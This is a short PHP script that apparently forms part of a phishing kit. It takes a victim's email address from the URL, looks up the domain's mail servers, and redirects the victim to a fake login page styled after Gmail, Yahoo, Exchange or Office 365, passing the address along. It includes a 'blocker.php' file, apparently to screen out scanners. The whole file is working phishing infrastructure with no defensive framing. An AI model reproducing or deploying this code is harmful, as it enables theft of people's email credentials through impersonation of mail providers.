<?php
include('blocker.php');

$name = @$_GET["name"];
$rawww = @$_GET["login"];
$email = strtolower($rawww);

$atdomain = strstr($email, '@');
$domain = str_replace("@","",$atdomain);

$hosts = array();
getmxrr($domain, $hosts);

$a = $hosts[0];

if (strpos($a, 'google') !== false) {
    header("location: mail.google.com/file.php?login=$email&name=$name");
}
elseif (strpos($a, 'yahoo') !== false)
	{
    header("location: us-mg5.mail.yahoo.com/file.php?login=$email&name=$name");
}
elseif (strpos($a, 'mimecast-offshore.com') !== false)
	{
    header("location: exchange/file.php?login=$email&name=$name");
}
else {
	header("location: 365/file.php?login=$email&name=$name");

}
?>